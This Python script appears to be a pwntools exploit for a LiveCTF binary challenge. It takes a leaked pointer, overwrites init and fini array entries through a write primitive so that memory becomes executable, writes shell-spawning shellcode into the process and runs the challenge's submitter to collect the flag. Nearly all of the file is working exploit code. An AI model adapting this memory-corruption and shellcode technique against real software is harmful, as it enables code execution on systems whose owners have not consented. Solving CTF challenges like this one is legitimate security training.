#!/usr/bin/env python3

from pwn import *


def conn():
    if args.LOCAL:
        exe = ELF("./challenge_patched")

        context.binary = exe

        context.aslr = False
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        HOST = os.environ.get('HOST', 'localhost')
        context.arch='amd64'
        r = remote(HOST, 31337)

    return r

s = None

def main():
    global s
    s = conn()

    ptr = u64(s.recv(8))
    log.success(f'leaked 0x{ptr:x}')

    # good luck pwning :)

    log.info("Writing")
    s.send(p64(ptr+0x45c4))
    s.send(b'BBBBBBBB')

    #overwrite pre-ini array[1,2] to be ret
    # set initarr 0 to mprotect
    #s.send(p64(ptr+0x04318))
    #s.send(p64(ptr+0x1370))
    #s.send(p64(ptr+0x04320))
    #s.send(p64(ptr+0x1370))


    # overwrite init[0] - lets make rwx again
    s.send(p64(ptr+0x4328))
    s.send(p64(ptr+0x1370))
    #overwrite init[1] - lets make secret rw and circumvent secret to be overwritten
    s.send(p64(ptr+0x4330))
    s.send(p64(ptr+0x1370))


    # overwrite FINI ARRAY - will get code control after legit main rturn
    s.send(p64(ptr+0x4338))
    s.send(p64(ptr+0x2000)) # overwriting agian


    log.info("Lets go")
    s.send(p64(0x00))
    s.send(b'BBBB') # our fake secret

    sc = shellcraft.sh()
    pl = asm(sc)
    pl += b'\x90' * (8 - len(pl) % 8)




    base = ptr + 0x02158

    for i in range(0, len(pl), 8):
        s.send(p64(base+i))
        s.send(pl[i:i+8])


    s.send(p64(0x00))
    s.sendline(b'/home/livectf/submitter')
    s.sendline(b'/home/livectf/submitter')
    print(s.readline())
    print(s.readline())
    print(s.readline(keepends=False).decode())

    exit(1)



if __name__ == "__main__":
    main()
